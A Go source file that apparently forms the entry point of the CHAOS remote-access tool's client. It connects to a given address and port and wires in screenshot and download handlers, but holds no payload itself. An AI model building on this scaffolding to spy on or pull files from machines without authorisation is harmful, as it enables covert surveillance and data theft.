package app

import (
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/client/app/handler"
	"github.com/tiagorlampert/CHAOS/client/app/handler/connection"
	"github.com/tiagorlampert/CHAOS/client/app/usecase"
	"github.com/tiagorlampert/CHAOS/client/app/usecase/download"
	"github.com/tiagorlampert/CHAOS/client/app/usecase/screenshot"
	"github.com/tiagorlampert/CHAOS/client/app/util/network"
)

type App struct {
	Handler handler.Handler
}

func NewApp(address, port string) *App {
	// Connection
	conn := network.NewConnection(address, port)

	// Use Case
	downloadUseCase := download.NewDownloadUseCase(conn)
	screenshotUseCase := screenshot.NewScreenshotUseCase(conn)

	useCase := usecase.UseCase{
		Download:   downloadUseCase,
		Screenshot: screenshotUseCase,
	}

	connectionHandler := connection.NewConnectionHandler(conn, &useCase)

	return &App{
		Handler: connectionHandler,
	}
}

func (app *App) Run() error {
	if err := app.Handler.Handle(); err != nil {
		log.WithField("cause", err.Error()).Error("error handling app connection")
		return err
	}
	return nil
}
